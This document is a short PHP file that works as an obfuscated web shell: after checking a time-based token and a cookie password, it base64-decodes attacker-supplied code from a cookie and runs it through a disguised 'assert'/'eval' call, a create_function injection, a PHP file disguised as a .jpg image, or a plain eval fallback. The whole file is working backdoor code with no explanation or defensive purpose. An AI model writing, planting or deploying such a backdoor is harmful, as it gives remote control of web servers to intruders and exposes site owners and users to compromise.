<?php
	error_reporting(0);
	header("Content-Type: text/html; charset=gbk");
	$time=array(md5(time()+96),md5(time()+97),md5(time()+98),md5(time()+99),md5(time()+100));
	if(!empty($_REQUEST['time'])&&$_REQUEST['time']!=$_GET['time']&&in_array($_REQUEST['time'],$time)){
		if(isset($_REQUEST['action'])&&$_REQUEST['action']=="pwd"){
			file_put_contents("pwd.txt",md5(md5(rand(1222,99999999)).rand(1222,99999999)));
			setcookie("hash",file_get_contents("pwd.txt"));
			setcookie("login",0);
		}elseif(isset($_COOKIE['a'])&&$_COOKIE['a']==file_get_contents("pwd.txt")){
			@unlink("pwd.txt");
			$code=base64_decode($_COOKIE['code']);
			$do="a123456ss123456er123456t";
			$php_code="eabc456vabc456aabc456l";
			if(function_exists("assert")){
				$func_name=@str_replace("123456", "", $do);
				$func_name(str_replace("abc456","",$php_code)."('".str_replace("'","\"",$code)."');");
			}elseif(function_exists("create_function")){
				create_function('$a',"1;}".$code."/*");
			}elseif(function_exists("include_once")){
				file_put_contents("tmp_Coconut.jpg",'<?php '.$code);
				include_once("tmp_Coconut.jpg");
				unlink("tmp_Coconut.jpg");
			}else{
				$a=function(){eval(base64_decode($_COOKIE['code']));};
				$a();
			}
		}
	}else{
		die("Permission denied");
	}
?>